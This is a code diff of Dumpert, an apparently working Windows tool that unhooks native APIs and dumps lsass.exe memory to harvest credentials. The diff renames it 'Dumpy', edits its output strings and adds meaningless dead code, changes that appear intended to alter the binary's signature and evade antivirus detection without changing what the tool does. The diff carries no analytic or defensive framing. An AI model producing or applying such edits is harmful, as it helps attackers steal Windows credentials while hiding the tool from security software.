@@ -55,7 +55,7 @@ BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
 	
 	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
 	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
+		wprintf(L"	[!] ZwWriteVirtualMemory failed. ya\n");
 		return FALSE;
 	}
 
@@ -134,7 +134,11 @@ BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
 	if (pWinVerInfo->hTargetPID == NULL) {
 		return FALSE;
 	}
-
+	int a = 0x41;
+	int b = 0x52;
+	if (a == 0x41) {
+		b = 0x54;
+	}
 	return TRUE;
 }
 
@@ -188,8 +192,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
 	wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
 	wprintf(L"         \\/                             \\/     \\/     \\/		\n");
-	wprintf(L"                                  Dumpert							\n");
-	wprintf(L"                               By Cneeliz @Outflank 2019		    \n\n");
+	wprintf(L"                                  Dumpy							\n");
+	wprintf(L"                               By Cneeliz @Outflank 2020		    \n\n");
 
 	LPCWSTR lpwProcName = L"lsass.exe";
 
@@ -288,7 +292,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		exit(1);
 	}
 
-	wprintf(L"[3] Create memorydump file:\n");
+	wprintf(L"[3] Create memorydumpy file:\n");
 
 	wprintf(L"	[+] Open a process handle.\n");
 	HANDLE hProcess = NULL;
@@ -314,7 +318,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	UNICODE_STRING uFileName;
 	RtlInitUnicodeString(&uFileName, chDmpFile);
 
-	wprintf(L"	[+] Dump %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
+	wprintf(L"	[+] Dumpy %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
 	
 	HANDLE hDmpFile = NULL;
 	IO_STATUS_BLOCK IoStatusBlock;
@@ -327,7 +331,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
-		wprintf(L"	[!] Failed to create dumpfile.\n");
+		wprintf(L"	[!] Failed to create dumpyfile.\n");
 		ZwClose(hProcess);
 		exit(1);
 	}
@@ -345,7 +349,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
 	}
 	else {
-		wprintf(L"	[+] Dump succesful.\n");
+		wprintf(L"	[+] Dumpy succesful.\n");
 	}
 
 	ZwClose(hDmpFile);
